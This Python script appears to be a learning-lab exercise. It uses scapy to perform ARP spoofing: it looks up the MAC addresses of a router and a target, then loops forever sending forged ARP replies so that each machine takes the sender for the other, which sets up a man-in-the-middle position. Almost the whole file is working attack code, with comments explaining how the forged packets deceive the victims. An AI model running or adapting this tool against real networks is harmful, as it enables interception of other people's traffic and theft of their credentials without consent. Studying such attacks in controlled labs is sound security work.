import scapy.all as scapy
import sys
import time

def get_mac_address(ipaddr):
	broadcast_layer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_layer = scapy.ARP(pdst=ipaddr)
	# Basically we are sending a broadcast msg to the n/w asking for the MAC address of the given IP.
	get_mac_packet = broadcast_layer/arp_layer
	answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0] # sending the packet & recieving answers.
	return answer[0][1].hwsrc # extracting MAC address from the answer
	# This is how we grab the MAC address, refer the networking screenshot for better understanding.

def spoof(router_ip, target_ip, router_mac, target_mac):
	packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip) # Sppofs the router. Normally the psrc will be the Kali IP (ip addr of machine that's sending the packet), to make this malicious & we specify the psrc as the target ip, so that we can send this packet to the router & make it seems it came from the target(Win 10) machine.
	packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip) # Spoofs the target Machine. Same concept applies here too, we want to send this packet to the Win 10 machine & make it seem it came from the router.
	scapy.send(packet1)
	scapy.send(packet2)

def main():
	if len(sys.argv) != 3:
		print(f" Usage : {sys.argv[0]} <router_ip> <target_ip>")
	else:
		router_ip = str(sys.argv[1])
		target_ip = str(sys.argv[2])

		target_mac = str(get_mac_address(target_ip))
		router_mac = str(get_mac_address(router_ip))

		print(router_mac)
		print(target_mac)

		try:
			while True: # The mac addresses will be automatically reset after a few seconds, so we use infinite loop.
				spoof(router_ip, target_ip, router_mac, target_mac)
				time.sleep(2)
		except KeyboardInterrupt:
			print("Closing the ARP Spoofer!...")
			exit(0)


if __name__ == "__main__":
    main()
